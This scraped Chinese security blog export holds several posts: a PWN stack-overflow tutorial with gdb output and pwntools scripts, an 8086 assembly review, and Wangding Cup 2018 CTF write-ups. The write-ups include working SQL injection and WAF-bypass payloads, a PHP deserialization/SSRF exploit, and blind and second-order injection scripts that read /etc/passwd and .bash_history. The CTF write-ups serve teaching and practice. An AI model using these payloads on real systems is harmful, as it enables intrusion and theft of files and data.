0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------]Invalid $PC address: 0x41416741[------------------------------------stack-------------------------------------]0000| 0xffffcdd0 (&quot;6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\\nB\\376&quot;, &lt;incomplete sequence \\367&gt;)0004| 0xffffcdd4 (&quot;AAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\\nB\\376&quot;, &lt;incomplete sequence \\367&gt;)0008| 0xffffcdd8 (&quot;A7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\\nB\\376&quot;, &lt;incomplete sequence \\367&gt;)0012| 0xffffcddc (&quot;MAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\\nB\\376&quot;, &lt;incomplete sequence \\367&gt;)0016| 0xffffcde0 (&quot;AA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\\nB\\376&quot;, &lt;incomplete sequence \\367&gt;)0020| 0xffffcde4 (&quot;ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\\nB\\376&quot;, &lt;incomplete sequence \\367&gt;)0024| 0xffffcde8 (&quot;jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\\nB\\376&quot;, &lt;incomplete sequence \\367&gt;)0028| 0xffffcdec (&quot;AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\\nB\\376&quot;, &lt;incomplete sequence \\367&gt;)[------------------------------------------------------------------------------]Legend: code, data, rodata, valueStopped reason: SIGSEGV0x41416741 in ?? () 12gdb-peda$ pattern_offset 0x414167411094805313 found at offset: 92 然后确定主机是否开启ASLR。 12➜ cat /proc/sys/kernel/randomize_va_space0 可见主机并没有开启ASLR。也可以使用ldd来看加载动态库时动态库的基址来确定是否开启ASLR。 12345678⚡ root@kali  ~/PWN  ldd 1linux-gate.so.1 (0xf7fd3000)libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7dcb000)/lib/ld-linux.so.2 (0xf7fd4000)⚡ root@kali  ~/PWN  ldd 1linux-gate.so.1 (0xf7fd3000)libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7dcb000)/lib/ld-linux.so.2 (0xf7fd4000) 两次libc的基址一样也说明了主机没有开启ASLR。然后我们可以在栈中部署一段shellcode然后让return addr的内容位shellcode的地址注意这块有个坑。gdb调试的时候栈地址和程序运行时不同所以我们需要开启core dump或者attach到运行的程序上来看程序运行时的栈地址。通过ulimit -c unlimited来开启core dump。然后让程序崩溃调试一下core dump来找shellcode的地址。 crack.py 123456from pwn import *io = process(&quot;./1&quot;)payload = &#x27;a&#x27; * 92payload += &#x27;bbbb&#x27; # eippayload += &#x27;cccc&#x27; # shellcodeio.send(payload) 这里bbbb是eip的位置cccc是shellcode的位置然后运行这个python后程序崩溃我们调试core dump(gdb -c core)文件找cccc的地址填到eip的位置即可。 1234567891011121314151617gdb-peda$ info reax 0x100 0x100ecx 0xffffcda0 0xffffcda0edx 0x100 0x100ebx 0x35414166 0x35414166esp 0xffffce00 0xffffce00ebp 0x414b4141 0x414b4141esi 0xf7fa7000 0xf7fa7000edi 0xf7fa7000 0xf7fa7000eip 0x41416741 0x41416741eflags 0x10286 [ PF SF IF RF ]cs 0x23 0x23ss 0x2b 0x2bds 0x2b 0x2bes 0x2b 0x2bfs 0x0 0x0gs 0x63 0x63 当你觉得你的脚本没有问题，但是却又怎么也出你想要的结果时，你就需要用到调试了 一个是设置context.log_level=&quot;debug&quot; 脚本在执行时就会输出debug的信息，你可以通过观察这些信息查找哪步出错了 用gdb.attach(p) 在发送payload前加入这条语句，同时加上pause() 时脚本暂停 然后就会弹出来一个开启gdb的终端，先在这个终端下好断点，然后回运行着脚本的那个终端按一下回车继续运行脚本，程序就会运行到断点，就可以调试了 1234567from pwn import* p = process(&#x27;./xxxx&#x27;) payload = ..... gdb.attach(p) pause() p.sendline(payload) p.interactive() 安全客-PWN入门"},{"title":"汇编回顾","date":"2020-02-29","updated":"2024-03-19","path":"2020/02/29/汇编回顾/","text":"栈相当于是独立的一块区域，专门保存变量信息等内容 1、CS是代码段寄存器，IP是指令指针寄存器（相当于偏移地址）。修改CS、IP的指令不同于修改通用的寄存器值的指令，修改通用寄存器的值可以用mov 指令（mav ax,123），mov指令被称为传送指令。修改CS、IP的指令是jmp指令。jmp指令被称为转移指令。 （1）同时修改代码段寄存器和指令指针寄存器，形如jmp 段地址：偏移地址。 jmp2AE3:3,执行后：CS=2AE3H，IP=0003H,CPU将在2AE33H处读取指令 （2）仅想修改IP的内容，形如“jmp 某一合法寄存器”,功能是用某一合法寄存器中的值修改IP的内容 jmpax，指令执行前：ax=1000H,CS=2000H,IP=0003H 指令执行后：ax=1000H,CS=2000H,IP=1000H。 2、一般来说，CPU在访问内存的时候要由相关部件提供内存单元的段地址和偏移地址，送入地址加法器合成物理地址。段寄存器提供段地址。8086CPU有4个段寄存器：CS、DS、ES、SS。典型的提供段地址和偏移地址的寄存器为CS和IP寄存器。也就是说，CPU会将CS:IP合成的物理地址指向的内容当作指令执行。CPU执行指令的步骤一般是： （1）将CS、IP中的内容送入地址加法器（段地址*16+偏移地址）合成物理地址。 （2）地址加法器将物理地址送入输入输出控制电路 （3）输入输出控制电路将物理地址送上地址总线 （4）然后CPU从物理地址指向的内存单元读取机器指令，并将机器指令通过数据总线送入CPU的输入输出控制电路。 （5）输入输出控制电路将读取的指令送入指令缓冲器，同时IP的内容更新为原内容加指令长度。 （6）然后，执行控制器执行机器指令，并将执行后的内容送入相应的寄存器。 3、在编程时，可以根据需要将一组内存单元定义为一个段。我们可以将长度为N（N&lt;=64KB,因为偏移地址长度为16位，最大为64KB）的一组代码存在一组连续、起始地址为16的倍数的内存单元中。这样，这段内存就可以看成是代码段，用来存放代码的。 4、查看CPU和内存，用机器指令和汇编指令编程,做实验 （1）打开程序调试工具：运行”cmd”-&gt;输入debug。 （2）Debug功能 1）用R命令查看、改变CPU寄存器的内容 2）用D命令查看内存中的内容 3）用E命令改写内存中的内容 4）用U命令将内存中的机器指令翻译成汇编指令 5）用T命令执行一条机器指令 6）用Debug的A命令以汇编指令的格式在内存中写入一条机器指令 Normal&gt;（3）输入输出控制电路将物理地址送上地址总线 （4）然后CPU从物理地址指向的内存单元读取机器指令，并将机器指令通过数据总线送入CPU的输入输出控制电路。 （5）输入输出控制电路将读取的指令送入指令缓冲器，同时IP的内容更新为原内容加指令长度。 （6）然后，执行控制器执行机器指令，并将执行后的内容送入相应的寄存器。 r命令查看寄存器的内容 r命令修改寄存器的内容（修改了ax、cs、ip寄存器的内容） d命令查看内存中的内容（d 起始地址），显示分别为地址、地址中的内容、内容的ascll字符形态。 d命令查看某范围的内存内容（形如d1000:0 9）。 e命令改写内存中的内容（e 起始地址数据 数据 数据…） e命令向内存中写入字符或字符串 e命令向内存中写入机器码，并使用u命令查看机器码对应的汇编 t命令执行执行一条或多条指令（先改变cs、ip寄存器的值） a命令以汇编指令的形式在内存中写入机器指令，并用d指令查看对应的机器码（之后也可以用t指令执行相应的指令）"},{"title":"网鼎杯2018","date":"2020-02-29","updated":"2024-03-19","path":"2020/02/29/网鼎杯2018/","text":"Fakebook 预期解 join界面注册一个帐号看到有博客地址，猜测可能有SSRF，登录后账户下面有博客内容，不出意外就是SSRF了，简单的试了几个协议发现不行，然后扫描一下目录发现robots.txt 12User-agent: *Disallow: /user.php.bak 下载这个源码 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpclass UserInfo&#123; public $name = &quot;&quot;; public $age = 0; public $blog = &quot;&quot;; public function __construct($name, $age, $blog) &#123; $this-&gt;name = $name; $this-&gt;age = (int)$age; $this-&gt;blog = $blog; &#125; function get($url) &#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) &#123; return 404; &#125; curl_close($ch); return $output; &#125; public function getBlogContents () &#123; return $this-&gt;get($this-&gt;blog); &#125; public function isValidBlog () &#123; $blog = $this-&gt;blog; return preg_match(&quot;/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i&quot;, $blog); &#125;&#125; 测试发现no参数处存在sql注入，测试 1234567891011?no=1 order by 4正常?no=1 order by 5[*] query error! (Unknown column &#x27;5&#x27; in &#x27;order clause&#x27;)?no=0 union select load_file(&quot;/var/www/html/flag.php&quot;),2,3,4no hack ~_~?no=0+unIon/**/select/**/1,load_file(&#x27;/var/www/html/flag.php&#x27;),1,1Notice: unserialize(): Error at offset 0 of 1 bytes in /var/www/html/view.php on line 31 1234暴库，这里有一个坑，不能union select一起使用，所以这里使用了大小写混淆加/**/绕过waf。具体流程如下view.php?no=-6%20unIon/**/select%201,table_name,3,4%20from%20information_schema.tables%20where%20table_schema=database()view.php?no=-6%20unIon/**/select%201,group_concat(column_name),3,4%20from%20information_schema.columns%20where%20table_schema=database()#view.php?no=-6%20unIon/**/select%201,data,3,4%20from%20users# 此处看到一个php序列化，联想之前的ssrf没有被利用，猜测后台是把data反序列化后得到网址，然后再去访问改网址，拿回数据，那么构造poc为 1234567891011&lt;?phpclass UserInfo&#123; public $name = &quot;&quot;; public $age = 0; public $blog = &quot;&quot;;&#125;$a=new UserInfo();$a-&gt;name=&quot;text&quot;;$a-&gt;blog=&quot;file:///var/www/html/flag.php&quot;;echo serialize($a);?&gt; 1/view.php?no=1 unIon/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:4:&quot;text&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27; 非预期解 SQL注入 load_file 12345678本地测试MariaDB [test]&gt; select load_file(&quot;/flag&quot;);+--------------------+| load_file(&quot;/flag&quot;) |+--------------------+| flag&#123;asdczxafa&#125; |+--------------------+ 写个脚本爆破 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748import requestsimport stringurl=&#x27;http://6cd9d24d-628c-457e-9e44-bde9259bce69.node3.buuoj.cn/login.php&#x27;letter = &#x27;&#123;&#125;&#123;&#125;0123456789_-&#123;&#125;,()&#x27;.format(string.ascii_uppercase,string.ascii_lowercase,&quot;&#123;&#125;&quot;)r=&quot;&quot;def BiggerThanMid(payload,num): # if bigger than num,it return True payload=payload.format(num) content=r.get(&quot;http://6cd9d24d-628c-457e-9e44-bde9259bce69.node3.buuoj.cn/view.php?no=&quot;+payload) if &quot;admin&quot; in content.text.encode(&quot;utf-8&quot;).decode(content.apparent_encoding): return True else: return Falsedef BinaryInjection(payload): # maxLength: Assume the maximum length of the database min = 1 # 最小的下标 max = 255 # 最大的下标 while (max-min)&gt;1: mid = (max + min) // 2 # 中间的下标每次向下取整(rounding down) if BiggerThanMid(payload,mid) : min = mid # 大于需要的猜的数，则将最小下标变为中间的 else : max = mid # 小于需要的猜的数，则将最大下标变为中间的 return maxdef databaseLength(): payload=&quot;admin&#x27; and if(length(database())&gt;&#123;&#125;,1,0)#&quot; # length of database return BinaryInjection(payload) # this function getxxxName or getFlagdef getxxxName(rawpayload,length=20): xxxName=&quot;&quot; for i in range(1,length): payload=rawpayload.format(i,&quot;&#123;&#125;&quot;) xxxName+=chr(BinaryInjection(payload)) print(xxxName) return xxxNameif __name__ == &quot;__main__&quot;: #1 and%20 if(ascii(substr(load_file(&quot;var/www/html/flag.php&quot;),&#123;&#125;,1))&lt;&#123;&#125;,0,1); r=requests.session() r.post(url,&#123;&quot;username&quot;:&quot;1&quot;, &quot;passwd&quot;:&quot;1&quot; &#125;) getLoadFile=&#x27;if(ascii(substr(load_file(&quot;/var/www/html/flag.php&quot;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)&#x27; TableName=getxxxName(getLoadFile,80) $flag = “flag{5452d364-5bc7-4d2a-9257-1dcff9012004}”; Unfinish 二次注入 题目如下 发现就一个登陆页面，于是尝试探测是否存在 register.php 注册页面。发现存在，立即注册登陆，并查看。 思路分析 登陆的时候用到的是邮箱和密码，而注册的时候还有一个用户名，而这个用户名却在登陆后显示了，所以我们考虑用户名这里可能存在 二次注入 。 还有一个点就是，我们抓取注册账号的数据包，一直重放数据包会发现返回的状态码都是 200 ，这里就有可能存在 update注入 ，之后发现并没有更新用户信息，所以应该不存在 update注入 。那我们就针对用户名部分，进行二次注入测试。 注册成功，会得到 302 状态码并跳转至 login.php ；如果注册失败，只会返回 200 状态码。所以构造 payload 如下： 1email=test@666.com&amp;username=0&#x27;%2B(select hex(hex(database())))%2B&#x27;0&amp;password=test 进行两次hex解码后得到数据库名为web： 12&gt;&gt;&gt; &quot;373736353632&quot;.decode(&#x27;hex&#x27;).decode(&#x27;hex&#x27;)&#x27;web&#x27; 至于为什么 payload 要进行两次 hex 加密，看下面这张图就明白了。 然后这里还要注意一个问题，就是当数据进过 两次hex 后，会得到较长的一串只含有数字的字符串，当这个长字符串转成数字型数据的时候会变成科学计数法，也就是说会丢失数据精度，如下： 所以这里我们使用 substr 每次取10个字符长度与 ‘0’ 相加，这样就不会丢失数据。但是这里使用逗号 , 会出错，所以可以使用类似 substr(‘test’ from 1 for 10) 这种写法来绕过，具体获取 flag 的代码如下： 首先手动注册上20个用户,每个用户负责带出不同位置的数据(脚本注册功能就是不行，登录没啥问题 奇怪了…) 1234567891011121314151617181920212223242526272829303132333435363738394041424344import requestsimport reurl=&quot;http://111.198.29.45:30329/&quot;r=requests.session()hearders=&#123; &quot;User-Agent&quot;: &quot;Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0&quot;, &quot;Referer&quot;: &quot;http://111.198.29.45:30329/register.php&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;Host&quot; : &quot;111.198.29.45:30329&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Connection&quot;: &quot;close&quot;&#125;pattern=re.compile(r&#x27;name&quot;&gt;\\n(.*)&lt;&#x27;)def payload(i): regist=&#123;&quot;email&quot;:&quot;&#123;&#125;@a.a&quot;.format(i+10), &quot;username&quot;:&quot;0&#x27;%2B(select substr(hex(hex((select * from flag))) from &#123;&#125; for 10))%2B&#x27;0&quot;.format(i*10+1), &quot;password&quot;:&quot;a&quot; &#125; return regist def hex_to_str(s): pattern = re.compile(r&#x27;[A-Z0-9]&#123;2&#125;&#x27;) return &#x27;&#x27;.join([chr(i) for i in [int(&#x27;0x&#x27;+str(b), 16) for b in pattern.findall(s) ]])registDict=[ payload(i) for i in range(20) ]flag=&quot;&quot;try: for i in range(20): r.headers.update(hearders) r.post(url+&quot;login.php&quot;,data=&#123;&quot;email&quot;:registDict[i][&#x27;email&#x27;],&quot;password&quot;:registDict[i][&#x27;password&#x27;]&#125;) cont=r.get(url+&quot;index.php&quot;) res=pattern.search(cont.text) res=res.group(1).strip() flag=flag+res print(hex_to_str(hex_to_str(flag)))#如果出错，输出具体错误except requests.RequestException as e: print(e) comment git泄露恢复 二次注入 https://www.cnblogs.com/iamstudy/articles/wangding_4th_game_web_writeup.html 扫描目录发现.git，用githacker(不是githack)下载，然后打开其实是不完整的php文件，然后git查看历史 没有commit的文件或者隐藏起来的 可以进行恢复 先cd到你执行脚本出来的文件夹，然后执行以下命令 （不出意外地话） 方法一 12git log --refloggit reset --hard af36ba2d86ee43cde7b95db513906975cb8ece03（就是第一个红线所指）先git log --reflog查看一下 可疑文件 然后在恢复他 方法二 12git stash list | teegit stash pop # 或者使用 git stash apply 恢复后的文件write_do.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?phpinclude &quot;mysql.php&quot;;session_start();if($_SESSION[&#x27;login&#x27;] != &#x27;yes&#x27;)&#123; header(&quot;Location: ./login.php&quot;); die();&#125;if(isset($_GET[&#x27;do&#x27;]))&#123;switch ($_GET[&#x27;do&#x27;])&#123;case &#x27;write&#x27;: $category = addslashes($_POST[&#x27;category&#x27;]); $title = addslashes($_POST[&#x27;title&#x27;]); $content = addslashes($_POST[&#x27;content&#x27;]); $sql = &quot;insert into board set category = &#x27;$category&#x27;, title = &#x27;$title&#x27;, content = &#x27;$content&#x27;&quot;; $result = mysql_query($sql); header(&quot;Location: ./index.php&quot;); break;case &#x27;comment&#x27;: $bo_id = addslashes($_POST[&#x27;bo_id&#x27;]); $sql = &quot;select category from board where id=&#x27;$bo_id&#x27;&quot;; $result = mysql_query($sql); $num = mysql_num_rows($result); if($num&gt;0)&#123; $category = mysql_fetch_array($result)[&#x27;category&#x27;]; $content = addslashes($_POST[&#x27;content&#x27;]); $sql = &quot;insert into comment set category = &#x27;$category&#x27;, content = &#x27;$content&#x27;, bo_id = &#x27;$bo_id&#x27;&quot;; $result = mysql_query($sql); &#125; header(&quot;Location: ./comment.php?id=$bo_id&quot;); break;default: header(&quot;Location: ./index.php&quot;);&#125;&#125;else&#123; header(&quot;Location: ./index.php&quot;);&#125;?&gt; 如果$_SESSION['login'] != 'yes'则会定位到login.php，在login.php页面发现提示 名字是zhangwei，密码是zhangweixxx，爆破后三位可知密码是zhangwei666，登录后就可进行留言操作了 关键代码 123456$category = mysql_fetch_array($result)[&#x27;category&#x27;]; $content = addslashes($_POST[&#x27;content&#x27;]); $sql = &quot;insert into comment set category = &#x27;$category&#x27;, content = &#x27;$content&#x27;, bo_id = &#x27;$bo_id&#x27;&quot;; 可以看出评论的category字段内容直接来自我们之前write写入进去的，所以造成了二次注入 在write里面把category字段赋值成123',content=user(),/* 然后在comment页面提交content内容为*/#来触发 拼接后的内容就是: 123456789$sql = &quot;insert into comment set category = &#x27;123&#x27;,content=user(),/*&#x27;, content = &#x27;*/#&#x27;, bo_id = &#x27;$bo_id&#x27;&quot;;insert into comment set category = &#x27;123&#x27;,content=user(),/*&#x27;, content = &#x27;*/#&#x27;, bo_id = &#x27;$bo_id&#x27; user()的值就被填入content的字段中了 还有一种就是利用DUPLICATE KEY，payload: ',content=database(),bo_id='1' ON DUPLICATE KEY UPDATE category=' 查询一下数据库和表没发现flag之类的 1123&#x27;,content=(select group_concat(table_name) from information_schema.tables where table_schema=database()),/* 接下来通过load_file()来加载外部文件看看 1234123&#x27;,content=(select( load_file(&#x27;/flag&#x27;))),/*没有flag123&#x27;,content=(select( load_file(&#x27;/etc/passwd&#x27;))),/* 看到有一个www用户，查看一下这个用户的历史命令： 12345678123&#x27;,content=(select( load_file(&#x27;/home/www/.bash_history&#x27;))),/*cd /tmp/unzip html.ziprm -f html.zipcp -r html /var/www/cd /var/www/html/rm -f .DS_Storeservice apache2 start 可以发现在/tmp/html目录中还有.DS_Store文件 1123&#x27;,content=(select( load_file(&#x27;/tmp/html/.DS_Store&#x27;))),/* 发现有些字符无法带出,所以进行hex编码带出 1123&#x27;,content=(select hex( load_file(&#x27;/tmp/html/.DS_Store&#x27;))),/* 100000001427564310000100000000800000010000000040A000000000000000000000000000000000000000000000800000008000000000000000000000000000000000000000002000000000000000B000000010000100000730074007200610070496C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000B000000090062006F006F007400730074007200610070496C6F63626C6F62000000100000004600000028FFFFFFFFFFFF00000000000B0063006F006D006D0065006E0074002E007000680070496C6F63626C6F6200000010000000CC0000002800000001FFFF000000000003006300730073496C6F63626C6F62000000100000015200000028FFFFFFFFFFFF0000000000190066006C00610067005F0038003900340036006500310066006600310065006500330065003400300066002E007000680070496C6F63626C6F6200000010000001D800000028FFFFFFFFFFFF0000000000050066006F006E00740073496C6F63626C6F62000000100000004600000098FFFFFFFFFFFF0000000000090069006E006400650078002E007000680070496C6F63626C6F6200000010000000CC0000009800000002FFFF000000000002006A0073496C6F63626C6F62000000100000015200000098FFFFFFFFFFFF000000000009006C006F00670069006E002E007000680070496C6F63626C6F6200000010000001D800000098FFFFFFFFFFFF000000000009006D007900730071006C002E007000680070496C6F63626C6F62000000100000004600000108FFFFFFFFFFFF00000000000600760065006E0064006F0072496C6F63626C6F6200000010000000CC00000108FFFFFFFFFFFF00000000000C00770072006900740065005F0064006F002E007000680070496C6F63626C6F62000000100000015200000108FFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000080B000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000002000000001000000400000000100000080000000010000010000000001000002000000000100000400000000000000000100001000000000010000200000000001000040000000000100008000000000010001000000000001000200000000000100040000000000010008000000000001001000000000000100200000000000010040000000000001008000000000000101000000000000010200000000000001040000000000000108000000000000011000000000000001200000000000000140000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000000000000100B000000450000040A000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000104445344420000000100000000000000000000000000000000000000000000000200000020000000600000000000000001000000800000000100000100000000010000020000000000000000020000080000001800000000000000000100002000000000010000400000000001000080000000000100010000000000010002000000000001000400000000000100080000000000010010000000000001002000000000000100400000000000010080000000000001010000000000000102000000000000010400000000000001080000000000000110000000000000012000000000000001400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 写个脚本解一下de.py 12345678910111213import repattern = re.compile(r&#x27;[A-Z0-9]&#123;2&#125;&#x27;)def hex_to_str(s): return &#x27;&#x27;.join([chr(i) for i in [int(&#x27;0x&#x27;+str(b), 16) for b in pattern.findall(s) ]])#raw=&quot;&quot;#with open(&#x27;raw&#x27;,&#x27;r&#x27;) as f:# raw=f.readlines()#raw=str(raw)raw=&quot;3C3F7068700A24666C6167203D2027666C61677B66396361316136622D396437382D313165382D393061332D6334623330316237623939627D273B0A3F3E0A&quot;print(hex_to_str(raw)) 发现flag_8946e1ff1ee3e40f.php 也可以用ASCII在线转换器 主要部分，粘贴到sublime里看看 12 \u0000\u0000\u0000\u0001Bud1\u0000\u0000\u0010\u0000\u0000\u0000\b\u0000\u0000\u0000\u0010\u0000\u0000\u0000\u0004\u0000b\u0000o\u0000o\u0000t\u0000s\u0000t\u0000r\u0000a\u0000pIlocblob\u0000\u0000\u0000\u0010\u0000\u0000\u0000F\u0000\u0000\u0000(ÿÿÿÿÿÿ\u0000\u0000\u0000\u0000\u0000 